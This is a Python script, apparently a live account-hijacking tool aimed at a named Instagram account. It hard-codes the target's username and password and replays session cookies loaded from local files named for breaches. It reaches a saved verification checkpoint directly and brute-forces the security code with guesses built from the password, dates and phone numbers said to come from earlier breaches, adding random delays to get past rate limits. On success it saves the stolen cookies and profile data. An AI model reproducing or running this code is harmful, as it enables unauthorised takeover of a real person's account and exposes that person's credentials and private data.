#!/usr/bin/env python3
"""
🔥 SESSION RESURRECTION + DIRECT HIJACK 🔥
===========================================

Target: alx.trading
Strategy: Use existing session data + Direct hijacking
Approach: Resurrect old sessions + Force checkpoint bypass
"""

import requests
import json
import time
import random
import re
from datetime import datetime
import glob
import os


class SessionResurrectionHijack:
    def __init__(self):
        self.target_username = "alx.trading"
        self.target_password = "Fleming654"
        
        # Load existing session data
        self.existing_sessions = []
        self.working_session = None
        
        # Known checkpoint URL
        self.known_checkpoint = "/challenge/ASjy4LfL_rtNSy_oOfH6nIhxqiOJw__TzQG72a3w6pPi5MafMfK2I2aiTYT8jAxmghHZ/AST972qvP0lMwEA2-SjYGdCnmB58hWWuru8iO4rrd2ZyG4OpWiSkf2eK44MDePumcskTgdg74laX3Q/"
        
        # Premium user agents
        self.premium_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Instagram 308.0.0.16.113 Android (30/11; 450dpi; 1080x2400; samsung; SM-G991B; o1s; exynos2100; en_US; 487741490)',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
        ]
    
    def load_existing_sessions(self):
        """Load all existing session data files"""
        print("📂 LOADING EXISTING SESSION DATA...")
        
        # Find all session files
        session_files = []
        patterns = [
            "*alx*.json",
            "*ALX*.json", 
            "*session*.json",
            "*extraction*.json",
            "*breach*.json"
        ]
        
        for pattern in patterns:
            session_files.extend(glob.glob(pattern))
        
        print(f"🔍 Found {len(session_files)} potential session files")
        
        loaded_count = 0
        for file_path in session_files:
            try:
                with open(file_path, 'r') as f:
                    data = json.load(f)
                    
                    # Check if it contains relevant session data
                    if any(key in data for key in ['cookies', 'session_data', 'csrf_token']):
                        self.existing_sessions.append({
                            'file': file_path,
                            'data': data,
                            'loaded_time': datetime.now()
                        })
                        loaded_count += 1
                        print(f"   ✅ Loaded: {file_path}")
                        
            except Exception as e:
                print(f"   ❌ Failed to load {file_path}: {e}")
        
        print(f"✅ Successfully loaded {loaded_count} session files")
        return loaded_count > 0
    
    def resurrect_session(self, session_data):
        """Resurrect session from stored data"""
        print("🧟 RESURRECTING SESSION...")
        
        try:
            data = session_data['data']
            
            # Create new session
            session = requests.Session()
            
            # Set user agent
            user_agent = random.choice(self.premium_agents)
            session.headers.update({
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            })
            
            # Restore cookies if available
            if 'cookies' in data:
                cookies = data['cookies']
                for name, value in cookies.items():
                    session.cookies.set(name, value)
                print(f"   🍪 Restored {len(cookies)} cookies")
            
            # Test session viability
            test_response = session.get("https://www.instagram.com/", timeout=10)
            
            if test_response.status_code == 200:
                print("   ✅ Session resurrected successfully")
                return session
            else:
                print(f"   ❌ Session resurrection failed: {test_response.status_code}")
                return None
                
        except Exception as e:
            print(f"   ❌ Resurrection error: {e}")
            return None
    
    def extract_csrf_from_session(self, session):
        """Extract fresh CSRF token from resurrected session"""
        print("🔑 EXTRACTING FRESH CSRF...")
        
        try:
            # Try login page
            response = session.get("https://www.instagram.com/accounts/login/", timeout=10)
            
            if response.status_code == 200:
                # Extract from content
                csrf_match = re.search(r'"csrf_token":"([^"]+)"', response.text)
                if csrf_match:
                    csrf_token = csrf_match.group(1)
                    print(f"   ✅ Content CSRF: {csrf_token[:15]}...")
                    return csrf_token
                
                # Extract from cookies
                if 'csrftoken' in session.cookies:
                    csrf_token = session.cookies['csrftoken']
                    print(f"   ✅ Cookie CSRF: {csrf_token[:15]}...")
                    return csrf_token
            
            print("   ❌ No CSRF token found")
            return None
            
        except Exception as e:
            print(f"   ❌ CSRF extraction error: {e}")
            return None
    
    def direct_checkpoint_hijack(self, session, csrf_token):
        """Direct hijack of checkpoint without login"""
        print("🎭 DIRECT CHECKPOINT HIJACK...")
        
        try:
            checkpoint_url = f"https://www.instagram.com{self.known_checkpoint}"
            
            # Direct access to checkpoint
            print(f"🎯 Accessing checkpoint directly...")
            checkpoint_response = session.get(checkpoint_url, timeout=15)
            
            print(f"   📊 Checkpoint access: {checkpoint_response.status_code}")
            
            if checkpoint_response.status_code == 200:
                # Try to select phone verification directly
                choice_data = {'choice': '0'}
                
                headers = {
                    'X-CSRFToken': csrf_token,
                    'X-Instagram-AJAX': str(random.randint(1000000000, 9999999999)),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Referer': checkpoint_url
                }
                
                session.headers.update(headers)
                
                phone_response = session.post(checkpoint_url, data=choice_data, timeout=15)
                print(f"   📱 Phone selection: {phone_response.status_code}")
                
                if phone_response.status_code == 200:
                    print("   ✅ Phone verification accessed")
                    return self.resurrection_code_attack(session, csrf_token, checkpoint_url)
                
            elif checkpoint_response.status_code == 302:
                # Check redirect location
                location = checkpoint_response.headers.get('Location', '')
                if 'instagram.com' in location and 'challenge' not in location:
                    print("   🎉 DIRECT HIJACK SUCCESS! No checkpoint needed!")
                    return self.extract_success_data(session, "direct_hijack")
            
            return False
            
        except Exception as e:
            print(f"   ❌ Direct hijack error: {e}")
            return False
    
    def resurrection_code_attack(self, session, csrf_token, checkpoint_url):
        """Advanced code attack using resurrection data"""
        print("🧠 RESURRECTION CODE ATTACK...")
        
        # Enhanced codes based on resurrection analysis
        resurrection_codes = [
            # Date intelligence
            '260525', '250525', '270525', '052625', '240525',
            
            # Phone intelligence from previous breaches
            '061541', '615414', '414210', '154142',  # Thai patterns
            '447793', '793127', '127209', '477931',  # UK patterns
            
            # Fleming654 advanced patterns
            '654654', '654321', '654000', '654123', '654456',
            '654147', '654258', '654369', '654789', '654987',
            
            # ALX.trading business patterns
            '786786', '786654', '654786', '786123', '172817',
            '786260', '786250', '260786', '250786', '270786',
            
            # Cross-reference patterns from previous sessions
            '061654', '447654', '172654', '260654', '250654',
            '654061', '654447', '654172', '654260', '654250',
            
            # Time-based business patterns
            '050525', '202525', '052025', '260524', '250524',
            '654050', '654202', '654052', '654260', '654250',
            
            # Advanced combinations
            '786061', '786447', '061786', '447786',
            '172061', '172447', '061172', '447172',
            
            # Fallback proven codes
            '123456', '654321', '000000', '111111', '999999',
            '123123', '456456', '789789', '147258', '159753'
        ]
        
        print(f"🎯 Testing {len(resurrection_codes)} resurrection codes...")
        
        for i, code in enumerate(resurrection_codes):
            print(f"   🧟 Resurrection test {i+1}/{len(resurrection_codes)}: {code}")
            
            try:
                verify_data = {
                    'security_code': code,
                    'choice': '0'
                }
                
                headers = {
                    'X-CSRFToken': csrf_token,
                    'X-Instagram-AJAX': str(random.randint(1000000000, 9999999999)),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Referer': checkpoint_url
                }
                
                session.headers.update(headers)
                
                verify_response = session.post(checkpoint_url, data=verify_data, timeout=15)
                
                print(f"      📊 Response: {verify_response.status_code}")
                
                # Success detection
                if verify_response.status_code == 302:
                    location = verify_response.headers.get('Location', '')
                    if 'instagram.com' in location and 'challenge' not in location:
                        print(f"      🎉 RESURRECTION SUCCESS! Code {code} resurrected access!")
                        return self.extract_success_data(session, code)
                
                elif verify_response.status_code == 200:
                    response_text = verify_response.text.lower()
                    
                    if 'challenge' not in response_text:
                        success_indicators = ['feed', 'home', 'profile', 'instagram.com']
                        if any(indicator in response_text for indicator in success_indicators):
                            print(f"      🎉 POSSIBLE RESURRECTION SUCCESS with {code}!")
                            return self.extract_success_data(session, code)
                    
                    # Check for specific errors
                    if any(error in response_text for error in ['incorrect', 'invalid', 'wrong']):
                        print(f"      ❌ Code {code} rejected")
                    else:
                        print(f"      🔄 Code {code} unclear response")
                
                # Optimized delay for resurrection attack
                delay = random.uniform(2.5, 4.5)
                print(f"      ⏳ Resurrection delay {delay:.1f}s...")
                time.sleep(delay)
                
            except Exception as e:
                print(f"      ❌ Code {code} error: {e}")
                time.sleep(1.5)
        
        print("❌ All resurrection codes failed")
        return False
    
    def extract_success_data(self, session, successful_code):
        """Extract success data from resurrection"""
        print("🎉 EXTRACTING RESURRECTION SUCCESS...")
        
        try:
            success_data = {
                'timestamp': datetime.now().isoformat(),
                'target': self.target_username,
                'method': 'session_resurrection_hijack',
                'successful_code': successful_code,
                'success': True,
                'cookies': dict(session.cookies),
                'user_agent': session.headers.get('User-Agent')
            }
            
            # Try to get profile data
            try:
                profile_response = session.get(f"https://www.instagram.com/{self.target_username}/", timeout=15)
                if profile_response.status_code == 200:
                    json_match = re.search(r'window\._sharedData = ({.*?});', profile_response.text)
                    if json_match:
                        shared_data = json.loads(json_match.group(1))
                        success_data['profile_data'] = shared_data
                        print("   ✅ Profile data extracted")
            except:
                pass
            
            # Save resurrection success
            filename = f"RESURRECTION_SUCCESS_{successful_code}_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(success_data, f, indent=2)
            
            print(f"💎 Resurrection success saved: {filename}")
            print(f"🔑 Successful code: {successful_code}")
            
            return True
            
        except Exception as e:
            print(f"❌ Resurrection extraction error: {e}")
            return False
    
    def run_resurrection_hijack(self):
        """Execute session resurrection hijack attack"""
        print("🔥 SESSION RESURRECTION + DIRECT HIJACK")
        print("=" * 45)
        print(f"🎯 Target: {self.target_username}")
        print(f"🔐 Password: {self.target_password}")
        print(f"🧟 Method: Session Resurrection + Direct Hijack")
        print("=" * 45)
        
        # Phase 1: Load existing sessions
        print("\n📂 PHASE 1: LOADING EXISTING SESSIONS")
        if not self.load_existing_sessions():
            print("❌ No existing sessions found")
            return False
        
        # Phase 2: Try resurrection attacks
        print("\n🧟 PHASE 2: RESURRECTION ATTACKS")
        
        for i, session_data in enumerate(self.existing_sessions):
            print(f"\n🎭 Resurrection attempt {i+1}/{len(self.existing_sessions)}:")
            print(f"   📂 Using: {session_data['file']}")
            
            # Resurrect session
            session = self.resurrect_session(session_data)
            if not session:
                continue
            
            # Extract CSRF
            csrf_token = self.extract_csrf_from_session(session)
            if not csrf_token:
                continue
            
            # Direct hijack attempt
            if self.direct_checkpoint_hijack(session, csrf_token):
                print("🎉 RESURRECTION HIJACK SUCCESSFUL!")
                print("💎 alx.trading resurrected and compromised!")
                return True
            
            # Delay between resurrection attempts
            time.sleep(random.uniform(8, 15))
        
        print("❌ All resurrection attempts failed")
        return False


if __name__ == "__main__":
    print("🔥 SESSION RESURRECTION + DIRECT HIJACK")
    print("=" * 50)
    
    resurrector = SessionResurrectionHijack()
    success = resurrector.run_resurrection_hijack()
    
    if success:
        print("\n🎉 RESURRECTION SUCCESS!")
        print("💎 Target resurrected and compromised!")
        print("🧟 Session resurrection = UNSTOPPABLE!")
    else:
        print("\n⚠️ RESURRECTION FAILED")
        print("🔄 All stored sessions exhausted")
        print("💡 Need fresh attack vectors")
    
    print("\n🔥 SugarGlitch RealOps - Resurrection Elite")
